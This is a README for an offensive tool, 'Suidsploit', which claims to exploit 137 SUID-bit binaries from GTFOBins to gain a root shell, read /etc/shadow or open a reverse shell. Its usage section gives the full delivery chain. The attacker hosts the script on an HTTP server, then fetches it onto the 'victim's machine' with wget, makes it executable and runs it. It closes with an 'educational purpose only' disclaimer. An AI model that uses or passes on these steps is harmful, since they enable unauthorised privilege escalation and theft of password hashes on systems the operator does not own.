# Suidsploit by Tizun & Silky

[![Build Status](https://travis-ci.org/joemccann/dillinger.svg?branch=master)](https://travis-ci.org/joemccann/dillinger)

Suidsploit is a Tool which can exploit 137 files from GTFO-Bins where the Suidbit is set.
On successful exploitation you can gain:

- Root Shell
- Output of /etc/shadow
- Reverse shell

![alt text](https://github.com/S1lkys/Suidsploit/blob/master/Suidsploit.png)


# Usage:
Open your favorite Terminal and run these commands.
On your machine:
- Download Suidsploit
- Start a HTTP-Server


$ git clone https://github.com/S1lkys/Suidsploit.git

$ cd Suidsploit/

$ python -m SimpleHTTPServer 80


On victims machine:
- download Suidsploit
- make it executable
- execute Suidsploit


$ wget http://192.168.xxx.xxx/Suidsploit.ob.sh

$ chmod +x Suidsploit.ob.sh

$ bash Suidsploit.ob.sh
### Todos

- Fix found Bugs
- Add new Tools

License
----
For educational Purpose only!
---
